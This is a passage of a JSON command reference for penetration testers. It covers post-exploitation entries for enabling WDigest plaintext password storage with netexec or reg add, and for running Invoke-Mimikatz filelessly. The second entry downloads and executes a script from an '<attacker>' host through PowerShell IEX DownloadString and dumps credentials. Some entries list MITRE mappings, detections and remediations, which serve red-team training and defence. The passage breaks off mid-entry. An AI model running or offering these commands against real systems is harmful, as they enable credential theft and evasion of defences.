  {
    "id": "crackmapexec-wdigest",
    "tool": "netexec",
    "category": "post_exploitation",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "netexec smb <target> -u admin -p pass -M wdigest -o ACTION=enable",
    "name": "Enable WDigest (Plaintext Passwords)",
    "description": "Enables WDigest authentication so next logon stores plaintext password in memory.",
    "arguments": {
      "-M wdigest": "WDigest module",
      "ACTION=enable": "Enable plaintext storage"
    },
    "expected_output": "[+] WDigest enabled. Next logon will store plaintext credentials.",
    "use_case": "Enable WDigest so mimikatz can extract plaintext passwords on next login.",
    "prerequisites": [
      "Admin access",
      "Target is Windows"
    ],
    "mitre_mapping": [
      "T1112"
    ],
    "mitre_tactic": "Defense Evasion",
    "detections": [
      "Registry modification (UseLogonCredential)",
      "WDigest setting change"
    ],
    "remediation": [
      "Monitor WDigest registry key",
      "Credential Guard"
    ],
    "common_mistakes": [
      "Credential Guard enabled"
    ],
    "alternatives": [
      "reg add HKLM\\SYSTEM\\...\\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
    ],
    "references": [
      "https://github.com/Pennyw0rth/NetExec"
    ],
    "tags": [
      "wdigest",
      "plaintext",
      "credentials",
      "registry"
    ]
  },
  {
    "id": "invoke-mimikatz",
    "tool": "powershell",
    "category": "post_exploitation",
    "phase": 6,
    "os": [
      "windows"
    ],
    "command": "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
    "name": "Invoke-Mimikatz (Fileless)",
    "description": "Runs Mimikatz entirely in memory via PowerShell \u2014 no binary on disk.",
    "arguments": {
      "IEX": "Invoke-Expression (download and execute)",
      "Invoke-Mimikatz": "PowerShell mimikatz wrapper"
    },
    "expected_output": "Hostname: PC01 / S-1-5-21-...\nmsv:\n Username: admin\n NTLM: fc525c96...",
    "use_case": "Extract credentials without writing mimikatz.exe to disk \u2014 harder to detect.",
    "prerequisites": [
      "PowerShell access",
      "Admin privileges",
      "AMSI bypass may be needed"
    ],
    "mitre_mapping": [
      "T1003.001"
    ],
    "mitre_tactic": "Credential Access",
    "detections": [
      "PowerShell script block logging",
      "AMSI alerts",
      "Memory-only execution"
    ],
    "remediation": [
      "AMSI",
      "Constrained Language Mode",
      "Script block logging"
    ],
    "common_mistakes": [
      "AMSI blocks",
      "CLM enabled"
    ],
    "alternatives": [
      "pypykatz",
      "SharpKatz",
      "nanodump"
    ],
    "references": [
      "https://github.com/PowerShellMafia/PowerSploit"
    ],
    "tags": [
